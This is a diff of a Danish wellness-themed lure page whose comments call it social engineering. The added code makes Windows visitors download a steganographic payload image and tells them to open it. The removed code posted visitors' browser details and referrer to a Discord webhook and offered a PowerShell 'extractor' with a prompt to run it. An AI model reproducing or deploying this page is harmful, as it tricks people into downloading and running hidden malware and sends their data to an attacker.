@@ -51,16 +51,6 @@
             margin-top: 20px;
             width: 100%;
         }
-        .premium-btn {
-            background: #28a745;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 20px;
-            font-size: 14px;
-            cursor: pointer;
-            margin: 10px 5px;
-        }
     </style>
 </head>
 <body>
@@ -78,64 +68,35 @@
             <p><strong>200+ medlemmer online nu</strong></p>
             <p>Klik på billedet for at aktivere din wellness-oplevelse og få adgang til:</p>
             <ul style="text-align: left;">
-                <li>🧘 Daily meditation guides</li>
-                <li>🌿 Organic supplement tips</li>
-                <li>💚 Holistic health coaching</li>
-                <li>⭐ Premium wellness content</li>
+                <li>Daily meditation guides</li>
+                <li>Organic supplement tips</li>
+                <li>Holistic health coaching</li>
+                <li>Premium wellness content</li>
             </ul>
             
             <button class="join-btn" onclick="joinGroup()">🔗 Join Telegram Group</button>
-            
-            <div style="margin-top: 20px; border-top: 1px solid #eee; padding-top: 20px;">
-                <p><small>🎁 <strong>Bonus:</strong> Download gratis wellness-guide</small></p>
-                <button class="premium-btn" onclick="downloadGuide()">📱 Download App</button>
-                <button class="premium-btn" onclick="downloadPCGuide()">💻 Windows Guide</button>
-            </div>
         </div>
     </div>
 
     <script>
         function activateWellness() {
             // Social engineering - "activate wellness experience"
-            downloadGuide();
+            if (navigator.userAgent.includes('Windows')) {
+                // Trigger steganographic payload extraction (requires user to download image)
+                var link = document.createElement('a');
+                link.href = 'wellness_community.png';
+                link.download = 'wellness_guide.png';
+                link.click();
+                
+                setTimeout(() => {
+                    alert('🧘‍♀️ Wellness guide downloaded! Åbn billedet for at aktivere din personlige meditation guide.');
+                }, 1000);
+            }
         }
         
         function joinGroup() {
-            // Redirect to legitimate Telegram
+            // Redirect to Telegram
             window.open('https://t.me/+YxJbAUDzpzEAAQAAAG82W3tzhTzY', '_blank');
-        }
-        
-        function downloadGuide() {
-            // Download steganographic image
-            var link = document.createElement('a');
-            link.href = 'wellness_community.png';
-            link.download = 'wellness_guide.png';
-            link.click();
-            
-            // Trigger beacon
-            fetch('https://discord.com/api/webhooks/1285243636399796285/dBG84iTwDcJJWXw5JD4d-DJhfnzVA5d5oKUQkqMhqRx4s6KEcE2xfSGHBKs4HYN1B7aN', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: `🎯 **Wellness Guide Downloaded**\n**User:** ${navigator.userAgent}\n**Time:** ${new Date().toISOString()}\n**Referrer:** ${document.referrer}`
-                })
-            }).catch(() => {});
-            
-            setTimeout(() => {
-                alert('🧘‍♀️ Wellness guide downloaded! Åbn billedet for at aktivere din personlige meditation guide.\n\nFor Windows brugere: Klik derefter på "Windows Guide" for avancerede funktioner.');
-            }, 1000);
-        }
-        
-        function downloadPCGuide() {
-            // Download PowerShell extractor for Windows users
-            var link = document.createElement('a');
-            link.href = 'stego_extractor.ps1';
-            link.download = 'wellness_extractor.ps1';
-            link.click();
-            
-            setTimeout(() => {
-                alert('💻 Windows Wellness Extractor downloaded!\n\nKør denne fil for at udtrække premium indhold fra dit wellness guide billede.');
-            }, 500);
         }
     </script>
 </body>
